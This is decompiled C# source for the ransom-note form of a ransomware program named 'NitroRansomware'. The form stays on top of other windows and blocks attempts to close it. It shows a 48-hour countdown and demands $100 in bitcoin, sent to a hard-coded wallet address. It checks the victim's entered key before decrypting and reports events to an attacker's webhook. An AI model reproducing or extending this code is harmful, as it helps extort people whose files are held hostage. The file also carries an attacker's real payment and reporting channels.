using System;
using System.ComponentModel;
using System.Drawing;
using System.Drawing.Text;
using System.Timers;
using System.Windows.Forms;
using NitroRansomware.Properties;

namespace NitroRansomware;

public class NitroRansomware : Form
{
	private Timer t;

	private int h = 48;

	private int m = 0;

	private int s = 0;

	private Webhook ww = new Webhook(Program.WEBHOOK);

	private IContainer components = null;

	private BackgroundWorker backgroundWorker1;

	private Label label1;

	private TextBox textBox1;

	private Label label2;

	private Label label3;

	private Panel panel1;

	private Label label6;

	private Button button2;

	private TextBox textBox4;

	private Label label7;

	private Panel panel3;

	private Label label10;

	private Button button1;

	private Label label4;

	private Label label8;

	private Label label5;

	private Label label9;

	private PictureBox pictureBox1;

	private PictureBox pictureBox2;

	private PictureBox pictureBox3;

	public NitroRansomware()
	{
		InitializeComponent();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		((Form)this).set_TopMost(true);
		t = new Timer();
		t.Interval = 1000.0;
		t.Elapsed += OnTimeEvent;
		t.Start();
	}

	private void Form1_FormClosing(object sender, FormClosingEventArgs e)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Invalid comparison between Unknown and I4
		((CancelEventArgs)(object)e).Cancel = (int)e.get_CloseReason() == 3;
	}

	private void button1_Click(object sender, EventArgs e)
	{
	}

	private void button2_Click(object sender, EventArgs e)
	{
		//IL_0036: Unknown result type (might be due to invalid IL or missing references)
		//IL_006c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0086: Unknown result type (might be due to invalid IL or missing references)
		string text = ((Control)textBox4).get_Text();
		if (text == Crypto.fPassword)
		{
			ww.Send("```User has entered correct decryption key. Decrypting files.```");
			MessageBox.Show("Key is correct. Decrypting files...", "Nitro Ransomware", (MessageBoxButtons)0, (MessageBoxIcon)64);
			Crypto.inPassword = Crypto.fPassword;
			Cursor.set_Current(Cursors.get_WaitCursor());
			Program.DecryptAll();
			Cursor.set_Current(Cursors.get_Default());
			MessageBox.Show("Task complete. If there are files that have not been decrypted, make sure you turn off all antiviruses and windows defender, then try decrypting again. \r\nIf it doesn't work, delete all Desktop.ini.givemenitro files that you see and try again.", "Nitro Ransomware", (MessageBoxButtons)0, (MessageBoxIcon)64);
			Program.RemoveStart();
		}
		else
		{
			MessageBox.Show("Invalid key", "Nitro Ransomware", (MessageBoxButtons)0, (MessageBoxIcon)16);
		}
	}

	private void label10_Click(object sender, EventArgs e)
	{
	}

	private void button1_Click_1(object sender, EventArgs e)
	{
		Clipboard.SetText(((Control)label9).get_Text());
	}

	private void pictureBox2_Click(object sender, EventArgs e)
	{
	}

	private void label4_Click(object sender, EventArgs e)
	{
	}

	private void OnTimeEvent(object sender, ElapsedEventArgs e)
	{
		((Control)this).Invoke((Delegate)(Action)delegate
		{
			//IL_00cb: Unknown result type (might be due to invalid IL or missing references)
			//IL_00d1: Expected O, but got Unknown
			//IL_00f0: Unknown result type (might be due to invalid IL or missing references)
			//IL_00fa: Expected O, but got Unknown
			if (s < 1)
			{
				s = 59;
				if (m == 0)
				{
					m = 59;
					if (h != 0)
					{
						h--;
					}
				}
				else
				{
					m--;
				}
			}
			else
			{
				s--;
			}
			if (s != 0 || m != 0 || h != 0)
			{
			}
			((Control)label10).set_Text($"{h.ToString().PadLeft(2, '0')}:{m.ToString().PadLeft(2, '0')}:{s.ToString().PadLeft(2, '0')}");
			PrivateFontCollection val = new PrivateFontCollection();
			val.AddFontFile("./Resources/DangeontheMotorway.otf");
			((Control)label10).set_Font(new Font(((FontCollection)val).get_Families()[0], 16f, (FontStyle)0));
		});
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0089: Expected O, but got Unknown
		//IL_008a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0094: Expected O, but got Unknown
		//IL_0095: Unknown result type (might be due to invalid IL or missing references)
		//IL_009f: Expected O, but got Unknown
		//IL_00a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00aa: Expected O, but got Unknown
		//IL_00ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b5: Expected O, but got Unknown
		//IL_00b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c0: Expected O, but got Unknown
		//IL_00c1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cb: Expected O, but got Unknown
		//IL_00cc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d6: Expected O, but got Unknown
		//IL_00d7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e1: Expected O, but got Unknown
		//IL_00e2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ec: Expected O, but got Unknown
		//IL_0148: Unknown result type (might be due to invalid IL or missing references)
		//IL_0152: Expected O, but got Unknown
		//IL_01f1: Unknown result type (might be due to invalid IL or missing references)
		//IL_01fb: Expected O, but got Unknown
		//IL_02bd: Unknown result type (might be due to invalid IL or missing references)
		//IL_02c7: Expected O, but got Unknown
		//IL_034d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0357: Expected O, but got Unknown
		//IL_048b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0495: Expected O, but got Unknown
		//IL_065e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0668: Expected O, but got Unknown
		//IL_0795: Unknown result type (might be due to invalid IL or missing references)
		//IL_079f: Expected O, but got Unknown
		//IL_08d7: Unknown result type (might be due to invalid IL or missing references)
		//IL_08e1: Expected O, but got Unknown
		//IL_0984: Unknown result type (might be due to invalid IL or missing references)
		//IL_098e: Expected O, but got Unknown
		//IL_0a2a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a34: Expected O, but got Unknown
		//IL_0abc: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ac6: Expected O, but got Unknown
		//IL_0e08: Unknown result type (might be due to invalid IL or missing references)
		//IL_0e12: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(NitroRansomware));
		backgroundWorker1 = new BackgroundWorker();
		label1 = new Label();
		textBox1 = new TextBox();
		label2 = new Label();
		label3 = new Label();
		panel1 = new Panel();
		label6 = new Label();
		button2 = new Button();
		textBox4 = new TextBox();
		label7 = new Label();
		panel3 = new Panel();
		label10 = new Label();
		button1 = new Button();
		label4 = new Label();
		label5 = new Label();
		label8 = new Label();
		label9 = new Label();
		pictureBox1 = new PictureBox();
		pictureBox2 = new PictureBox();
		pictureBox3 = new PictureBox();
		((Control)panel1).SuspendLayout();
		((Control)panel3).SuspendLayout();
		((ISupportInitialize)pictureBox1).BeginInit();
		((ISupportInitialize)pictureBox2).BeginInit();
		((ISupportInitialize)pictureBox3).BeginInit();
		((Control)this).SuspendLayout();
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Font(new Font("Microsoft Sans Serif", 24f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label1).set_ForeColor(Color.Red);
		((Control)label1).set_Location(new Point(156, 13));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(579, 37));
		((Control)label1).set_TabIndex(2);
		((Control)label1).set_Text(" Oh no! Your files have been encrypted.");
		((Control)textBox1).set_BackColor(Color.FromArgb(35, 39, 42));
		((TextBoxBase)textBox1).set_BorderStyle((BorderStyle)0);
		((Control)textBox1).set_Font(new Font("Segoe UI", 9f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)textBox1).set_ForeColor(SystemColors.MenuBar);
		((Control)textBox1).set_Location(new Point(382, 114));
		((TextBoxBase)textBox1).set_Multiline(true);
		((Control)textBox1).set_Name("textBox1");
		((TextBoxBase)textBox1).set_ReadOnly(true);
		textBox1.set_ScrollBars((ScrollBars)2);
		((Control)textBox1).set_Size(new Size(488, 289));
		((Control)textBox1).set_TabIndex(3);
		((Control)textBox1).set_TabStop(false);
		((Control)textBox1).set_Text(componentResourceManager.GetString("textBox1.Text"));
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_Font(new Font("Segoe UI", 14.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label2).set_ForeColor(SystemColors.Control);
		((Control)label2).set_Location(new Point(624, 76));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(45, 25));
		((Control)label2).set_TabIndex(5);
		((Control)label2).set_Text("Info");
		((Control)label3).set_AutoSize(true);
		((Control)label3).set_Font(new Font("Segoe UI", 14.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label3).set_ForeColor(SystemColors.Control);
		((Control)label3).set_Location(new Point(118, 76));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(147, 25));
		((Control)label3).set_TabIndex(6);
		((Control)label3).set_Text("Time Remaining");
		((Control)panel1).set_BackColor(Color.FromArgb(35, 39, 42));
		((Control)panel1).get_Controls().Add((Control)(object)pictureBox3);
		((Control)panel1).get_Controls().Add((Control)(object)pictureBox2);
		((Control)panel1).get_Controls().Add((Control)(object)label1);
		((Control)panel1).set_ForeColor(SystemColors.ActiveCaptionText);
		((Control)panel1).set_Location(new Point(-1, -4));
		((Control)panel1).set_Name("panel1");
		((Control)panel1).set_Size(new Size(899, 64));
		((Control)panel1).set_TabIndex(4);
		((Control)label6).set_AutoSize(true);
		((Control)label6).set_Font(new Font("Segoe UI", 10f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label6).set_ForeColor(SystemColors.Control);
		((Control)label6).set_Location(new Point(149, 358));
		((Control)label6).set_Name("label6");
		((Control)label6).set_Size(new Size(84, 19));
		((Control)label6).set_TabIndex(13);
		((Control)label6).set_Text("Decrypt files");
		((Control)button2).set_BackColor(SystemColors.ButtonHighlight);
		((ButtonBase)button2).set_FlatStyle((FlatStyle)0);
		((Control)button2).set_Location(new Point(21, 459));
		((Control)button2).set_Name("button2");
		((Control)button2).set_Size(new Size(347, 41));
		((Control)button2).set_TabIndex(15);
		((Control)button2).set_Text("Decrypt files");
		((ButtonBase)button2).set_UseVisualStyleBackColor(false);
		((Control)button2).add_Click((EventHandler)button2_Click);
		((Control)textBox4).set_BackColor(Color.FromArgb(35, 39, 42));
		((TextBoxBase)textBox4).set_BorderStyle((BorderStyle)1);
		((Control)textBox4).set_ForeColor(SystemColors.Window);
		((Control)textBox4).set_Location(new Point(22, 426));
		((Control)textBox4).set_Name("textBox4");
		((Control)textBox4).set_Size(new Size(346, 20));
		((Control)textBox4).set_TabIndex(17);
		((Control)textBox4).set_TabStop(false);
		((Control)textBox4).set_Text("Enter The Key Code Here And Click Decrypt files Button");
		textBox4.set_TextAlign((HorizontalAlignment)2);
		((Control)label7).set_AutoSize(true);
		((Control)label7).set_Font(new Font("Segoe UI", 8f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label7).set_ForeColor(SystemColors.Control);
		((Control)label7).set_Location(new Point(78, 395));
		((Control)label7).set_Name("label7");
		((Control)label7).set_Size(new Size(236, 13));
		((Control)label7).set_TabIndex(16);
		((Control)label7).set_Text("Warning: Do not try guessing the password.");
		((Control)panel3).set_BackColor(Color.FromArgb(35, 39, 42));
		((Control)panel3).get_Controls().Add((Control)(object)label8);
		((Control)panel3).get_Controls().Add((Control)(object)label5);
		((Control)panel3).get_Controls().Add((Control)(object)label10);
		((Control)panel3).set_Location(new Point(21, 114));
		((Control)panel3).set_Name("panel3");
		((Control)panel3).set_Size(new Size(347, 178));
		((Control)panel3).set_TabIndex(21);
		((Control)label10).set_AutoSize(true);
		((Control)label10).set_Font(new Font("Microsoft Sans Serif", 50f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label10).set_ForeColor(SystemColors.ControlLightLight);
		((Control)label10).set_Location(new Point(28, 93));
		((Control)label10).set_Name("label10");
		((Control)label10).set_Size(new Size(293, 76));
		((Control)label10).set_TabIndex(22);
		((Control)label10).set_Text("00:00:00");
		((Control)label10).add_Click((EventHandler)label10_Click);
		((Control)button1).set_BackColor(SystemColors.ButtonHighlight);
		((ButtonBase)button1).set_FlatStyle((FlatStyle)0);
		((Control)button1).set_Location(new Point(794, 477));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(76, 23));
		((Control)button1).set_TabIndex(23);
		((Control)button1).set_Text("Copy");
		((ButtonBase)button1).set_UseVisualStyleBackColor(false);
		((Control)button1).add_Click((EventHandler)button1_Click_1);
		((Control)label4).set_AutoSize(true);
		((Control)label4).set_Font(new Font("Impact", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label4).set_ForeColor(Color.DarkOrange);
		((Control)label4).set_Location(new Point(488, 444));
		((Control)label4).set_Name("label4");
		((Control)label4).set_Size(new Size(306, 20));
		((Control)label4).set_TabIndex(24);
		((Control)label4).set_Text("Send  $100  worth  of  bitcoin  to  this  address:");
		((Control)label5).set_AutoSize(true);
		((Control)label5).set_BackColor(Color.FromArgb(35, 39, 42));
		((Control)label5).set_Font(new Font("Impact", 15.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label5).set_ForeColor(Color.DarkOrange);
		((Control)label5).set_Location(new Point(71, 12));
		((Control)label5).set_Name("label5");
		((Control)label5).set_Size(new Size(212, 26));
		((Control)label5).set_TabIndex(3);
		((Control)label5).set_Text("Your files will be lost on");
		((Control)label8).set_AutoSize(true);
		((Control)label8).set_BackColor(Color.FromArgb(35, 39, 42));
		((Control)label8).set_Font(new Font("Microsoft Sans Serif", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label8).set_ForeColor(Color.White);
		((Control)label8).set_Location(new Point(128, 73));
		((Control)label8).set_Name("label8");
		((Control)label8).set_Size(new Size(84, 20));
		((Control)label8).set_TabIndex(23);
		((Control)label8).set_Text("Time Left");
		((Control)label9).set_BackColor(Color.White);
		((Control)label9).set_Font(new Font("Microsoft Sans Serif", 10f));
		((Control)label9).set_ForeColor(Color.Black);
		((Control)label9).set_Location(new Point(489, 477));
		((Control)label9).set_Name("label9");
		((Control)label9).set_Size(new Size(299, 23));
		((Control)label9).set_TabIndex(25);
		((Control)label9).set_Text("3NA2hxPUPGqTkvXsMXwhGKUpE5jqumMyYi");
		label9.set_TextAlign((ContentAlignment)32);
		pictureBox1.set_Image((Image)(object)Resources.WannaCry_BitcoinICON);
		((Control)pictureBox1).set_Location(new Point(382, 444));
		((Control)pictureBox1).set_Name("pictureBox1");
		((Control)pictureBox1).set_Size(new Size(100, 56));
		pictureBox1.set_SizeMode((PictureBoxSizeMode)1);
		pictureBox1.set_TabIndex(26);
		pictureBox1.set_TabStop(false);
		((Control)pictureBox2).set_BackgroundImageLayout((ImageLayout)0);
		pictureBox2.set_Image((Image)(object)Resources.mafia_png_transparent_mafia_images_16792_removebg_preview);
		((Control)pictureBox2).set_Location(new Point(-24, 3));
		((Control)pictureBox2).set_Name("pictureBox2");
		((Control)pictureBox2).set_Size(new Size(133, 64));
		pictureBox2.set_SizeMode((PictureBoxSizeMode)4);
		pictureBox2.set_TabIndex(27);
		pictureBox2.set_TabStop(false);
		((Control)pictureBox2).add_Click((EventHandler)pictureBox2_Click);
		((Control)pictureBox3).set_BackgroundImageLayout((ImageLayout)0);
		pictureBox3.set_Image((Image)(object)Resources.mafia_png_transparent_mafia_images_16792_removebg_preview);
		((Control)pictureBox3).set_Location(new Point(786, 3));
		((Control)pictureBox3).set_Name("pictureBox3");
		((Control)pictureBox3).set_Size(new Size(133, 64));
		pictureBox3.set_SizeMode((PictureBoxSizeMode)4);
		pictureBox3.set_TabIndex(28);
		pictureBox3.set_TabStop(false);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.FromArgb(44, 47, 51));
		((Form)this).set_ClientSize(new Size(896, 524));
		((Form)this).set_ControlBox(false);
		((Control)this).get_Controls().Add((Control)(object)pictureBox1);
		((Control)this).get_Controls().Add((Control)(object)label9);
		((Control)this).get_Controls().Add((Control)(object)label4);
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Control)this).get_Controls().Add((Control)(object)panel3);
		((Control)this).get_Controls().Add((Control)(object)textBox4);
		((Control)this).get_Controls().Add((Control)(object)label7);
		((Control)this).get_Controls().Add((Control)(object)button2);
		((Control)this).get_Controls().Add((Control)(object)label6);
		((Control)this).get_Controls().Add((Control)(object)label3);
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).get_Controls().Add((Control)(object)textBox1);
		((Control)this).get_Controls().Add((Control)(object)panel1);
		((Control)this).set_ForeColor(SystemColors.ControlText);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Control)this).set_Name("NitroRansomware");
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).set_Text("Nitro-Ransomware");
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)panel1).ResumeLayout(false);
		((Control)panel1).PerformLayout();
		((Control)panel3).ResumeLayout(false);
		((Control)panel3).PerformLayout();
		((ISupportInitialize)pictureBox1).EndInit();
		((ISupportInitialize)pictureBox2).EndInit();
		((ISupportInitialize)pictureBox3).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
